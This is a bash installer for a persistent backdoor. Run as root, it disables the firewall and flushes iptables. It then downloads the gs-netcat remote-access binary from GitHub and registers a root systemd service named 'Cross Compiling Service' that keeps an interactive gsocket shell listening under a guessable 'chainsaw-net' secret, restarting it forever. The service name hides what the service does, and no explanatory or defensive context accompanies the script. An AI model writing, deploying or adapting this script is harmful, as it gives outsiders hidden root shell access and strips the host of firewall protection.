#!/bin/bash

if [ "$EUID" -ne 0 ]
        then echo "Run as root."
        exit
fi

ufw disable
iptables -F

ARCH=$(dpkg --print-architecture)

AMD64="https://github.com/hackerschoice/binary/raw/main/gsocket/bin/gs-netcat_x86_64-alpine.tar.gz"
AARCH64="https://github.com/hackerschoice/binary/raw/main/gsocket/bin/gs-netcat_aarch64-linux.tar.gz"

case $ARCH in
        "amd64")
                wget $AMD64 -O /tmp/gs-netcat.tar.gz;;

        "aarch64")
                wget $AARCH64 -O /tmp/gs-netcat.tar.gz;;

        *)
                echo "Binary not found to" $ARCH
esac

printf "Machine's number: "
read num

num=$(printf "%04d\n" $num)
machine="chainsaw-net"$num

tar -xvf /tmp/gs-netcat.tar.gz -C /tmp/
chmod +x /tmp/gs-netcat
rm /tmp/gs-netcat.tar.gz
mv /tmp/gs-netcat /bin/gs-netcat

echo "\$(gs-netcat -li -s $machine -q)" > /bin/chainsaw
chmod +x chainsaw

cat << EOF > /etc/systemd/system/gs.service
[Unit]
Description=Cross Compiling Service
After=newtork.target
StartLimitIntervalSec=0
[Service]
Restart=always
RestartSec=1
User=root
ExecStart=bash /bin/chainsaw
[Install]
WantedBy=multi-user.target
EOF

systemctl enable gs --now
systemctl status gs

sleep 3
reboot now
